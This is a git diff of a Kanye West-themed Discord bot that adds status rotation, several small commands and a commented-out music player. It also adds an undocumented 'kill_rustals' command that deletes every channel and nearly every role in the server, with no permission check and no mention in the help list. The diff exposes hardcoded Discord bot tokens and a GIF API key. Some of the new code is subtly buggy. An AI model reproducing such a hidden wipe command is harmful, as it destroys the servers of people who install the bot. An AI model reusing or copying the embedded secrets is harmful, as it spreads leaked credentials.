@@ -1,16 +1,19 @@
 import discord
+import random
 
-from random import random
-from discord.ext import commands
+from discord.ext import commands, tasks
 from Embeds.Embeds import embed_help
 from SRC.reddit import gather_post_info, upvotes, titles, pictures, links
 from SRC.utilites import get_gif, get_random_gif, output_random_quote
+from SRC.will_checker import gather_will_info
+from SRC.music import play_help_embed
 
-gif_api_key = "89HJRRKY8549"
 client = commands.Bot(command_prefix="!ye ")
 client.remove_command("help")
+list_of_status = ["College Dropout", "Late Registration", "Graduation", "808s & Heartbreaks", "My Dark Fantasy", "Watch The Throne", "YEEZUS", "The Life of Pablo", "YE", "Kids See Ghosts", "Jesus Is King", "Sunday Service"]
 list_of_commands = [['help', "Shows list of commands"],
                     ['play {album] or {link} or {song}', "Plays the desired song/album"],
+                    ['play help', "Shows help info"],
                     ['gif', "Shows random Kanye gif"],
                     ['subreddit', "Shows top 5 r/Kanye posts"],
                     ['quote', "Shows random quote"],
@@ -18,24 +21,84 @@ list_of_commands = [['help', "Shows list of commands"],
                     ['kobe', "Shows legendary Kanye + Kobe video"]]
 
 
-@client.command()
+@tasks.loop(seconds=60)
+async def change_status():
+    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=list_of_status[random.randint(0, 10)]))
+
+
+@client.command(pass_context=True, commands=["kill_rustals"])
+async def kill_rustals(ctx):
+    for channel in ctx.message.guild.channels:
+        if channel == "Text Channels":
+            continue
+        elif channel == "Voice Channels":
+            continue
+        await channel.delete()
+        print(str(channel) + " Deleted!")
+    index = 0
+    for role in ctx.message.guild.roles:
+        if index == 0:
+            index += 1
+            continue
+        print(str(role) + " Deleted!")
+        await role.delete()
+        index += 1
+
+
+@client.command(pass_context=True)
+async def leave(ctx):
+    for x in client.voice_clients:
+        if x.channel == ctx.author.voice.channel:
+            return await x.disconnect()\
+
+
+@client.command(pass_context=True)
+async def will(ctx):
+    await ctx.author.edit(name="wfaf")
+
+
+@client.command(pass_context=True, commands=["play help"])
+async def play_help(ctx):
+    for x in client.voice_clients:
+        if x.channel == ctx.author.voice.channel:
+            return await x.disconnect()
+
+
+#@client.command(pass_context=True)
+# async def play(ctx, *, song=None, channel: discord.VoiceChannel = None):
+#     if not channel and not ctx.author.voice:
+#         await ctx.send("Your not in a voice channel!")
+#     else:
+#         if not song:
+#             await ctx.send(embed=play_help_embed)
+#         else:
+#             destination = channel or ctx.author.voice.channel
+#             vc = await destination.connect()
+#             async with ctx.typing():
+#                 try:
+#                     source = await YTDLSource.create_source(ctx, search, loop=self.bot.loop)
+#                 except YTDLError as e:
+#                     await ctx.send('An error occurred while processing this request: {}'.format(str(e)))
+#                 else:
+#                     song = Song(source)
+#
+#                     await ctx.voice_state.songs.put(song)
+#                     await ctx.send('Enqueued {}'.format(str(source)))
+
+
+@client.command(pass_context=True)
 async def help(ctx):
     await ctx.send(embed=embed_help(list_of_commands))
 
 
-@client.command()
-async def play(ctx):
-    pass
-
-
-@client.command()
+@client.command(pass_context=True)
 async def gif(ctx):
     list = get_random_gif()
     for response in list['results']:
         await ctx.send(response["url"])
 
 
-@client.command()
+@client.command(pass_context=True)
 async def subreddit(ctx):
     await ctx.send(f"One moment {ctx.author}")
     gather_post_info()
@@ -52,18 +115,18 @@ async def subreddit(ctx):
         index += 1
 
 
-@client.command()
+@client.command(pass_context=True)
 async def quote(ctx):
     random_quote = output_random_quote()[random.randint(0, 25)]
     await ctx.send("\"" + random_quote.strip("\n") + "\"")
 
 
-@client.command()
+@client.command(pass_context=True)
 async def god(ctx):
     await ctx.send("https://tenor.com/view/kanye-agod-iam-agod-kanye-west-conceited-gif-5313292")
 
 
-@client.command()
+@client.command(pass_context=True)
 async def kobe(ctx):
     await ctx.send("https://youtu.be/uxgHmbM3Ig0")
 
@@ -71,7 +134,7 @@ async def kobe(ctx):
 @client.event
 async def on_ready():
     print("The bot is ready!")
-    await client.change_presence(activity=discord.Game(name='Listening to YEEZUS'))
+    change_status.start()
 
 
-client.run('NjkyNTc2MTcxOTAwMTQxNTk4.Xn-F3Q.ydOaSVU-5N2nl5bO6PJOGTPN3j8')
+client.run('NjkyNTc2MTcxOTAwMTQxNTk4.Xn-Nlw.dRACkNS6upNqaAhIZG5ms0_gpQY')
